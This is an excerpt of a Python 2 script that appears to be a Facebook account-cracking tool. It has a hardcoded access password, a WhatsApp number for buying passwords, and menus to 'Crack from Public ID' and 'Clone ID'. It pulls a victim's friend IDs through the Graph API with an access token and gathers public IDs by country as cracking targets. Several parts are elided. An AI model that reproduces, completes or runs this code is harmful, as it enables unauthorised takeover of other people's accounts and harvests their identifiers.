# -*- coding: utf-8 -*-
import os, sys
print '\x1b[1;33mID  Password'
print '\x1b[1;32mlovehacker'
print '\x1b[1;32mBlackMafia '
import os, sys
...
if sandi == 'BlackMafia' and user == 'lovehacker':
    print 'Anda Telah Login'
    sys.exit
else:
    print 'Login GAGAL, Is WhatsApp Num Sy 03094161457 password lain'
    wa()
    restart()
...
def login():
    ...
    try:
        ...
        print '\n \x1b[1;91m[\xe2\x98\x86] \x1b[1;92mFACEBOOK \x1b[1;91m[\xe2\x98\x86]'
...
def super():
    ...
    print '║-> \x1b[1;37;40m2. Crack from Public ID'
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mClone ID \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
...
def grab():
    ...
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Get Public ID From ID From USA'
    print '║-> \x1b[1;37;40m2. Get Public ID From INDIA'
    print '║-> \x1b[1;37;40m3. Get Public ID From Pakistan'
